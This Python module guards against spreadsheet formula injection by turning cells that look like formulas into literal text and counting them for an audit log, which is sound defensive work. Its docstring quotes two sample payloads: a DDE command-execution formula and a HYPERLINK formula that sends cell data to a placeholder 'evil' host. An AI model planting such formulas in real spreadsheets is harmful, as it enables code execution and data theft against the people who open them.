"""Safety: formula-injection guard.

Values arriving from untrusted sources (imported CSVs, another workbook, a
model-proposed literal) that begin with ``=``, ``+``, ``-``, ``@``, tab, or CR
are interpreted by Excel as formulas. That is the classic spreadsheet injection
attack: ``=cmd|'/c calc'!A1`` or ``=HYPERLINK("http://evil/steal?"&A2)``.

Policy: a value that looks like a formula is written as **literal text** and the
number of neutralised cells is reported in the ``OperationResult``. It is never
silently written as a live formula, and never silently dropped — the count is
in the manifest so an operator can see what was contained.
"""

from __future__ import annotations

from typing import Any

#: Leading characters Excel treats as the start of a formula.
#: ``-`` and ``+`` are included because Excel coerces them, which is why CSV
#: exporters that prefix a quote still need care.
FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")

#: Prefixes Excel uses to force a cell to be treated as text. ``'`` is the
#: classic marker; the tab form is what several CSV writers emit.
TEXT_PREFIXES = ("'",)


def looks_like_formula(value: Any) -> bool:
    """Whether a value would be interpreted as a formula if written as-is.

    Only ``str`` values are at risk; numbers, dates, and booleans are not.
    """
    if not isinstance(value, str) or not value:
        return False
    return value[0] in FORMULA_TRIGGERS


def neutralise(value: Any) -> Any:
    """Convert a formula-like string to safe literal text.

    Prefixing with an apostrophe makes Excel treat the content as text while
    displaying it without the apostrophe. The stored value keeps the original
    text so no information is lost.

    Non-strings, and strings that are not formula-like, pass through unchanged.
    """
    if not looks_like_formula(value):
        return value
    text = str(value)
    if text.startswith(TEXT_PREFIXES):
        return text
    return f"'{text}"


def neutralise_row(row: tuple[Any, ...]) -> tuple[tuple[Any, ...], int]:
    """Neutralise every cell in a row, returning the row and the count changed."""
    if not any(looks_like_formula(value) for value in row):
        return row, 0
    converted = tuple(neutralise(value) for value in row)
    return converted, sum(
        1 for before, after in zip(row, converted, strict=True) if before != after
    )


def describe(value: Any) -> str:
    """A short, safe description of what neutralisation would do, for the audit log."""
    if not looks_like_formula(value):
        return "no change"
    return f"formula-like value {str(value)[:40]!r} written as literal text"


__all__ = [
    "FORMULA_TRIGGERS",
    "TEXT_PREFIXES",
    "describe",
    "looks_like_formula",
    "neutralise",
    "neutralise_row",
]
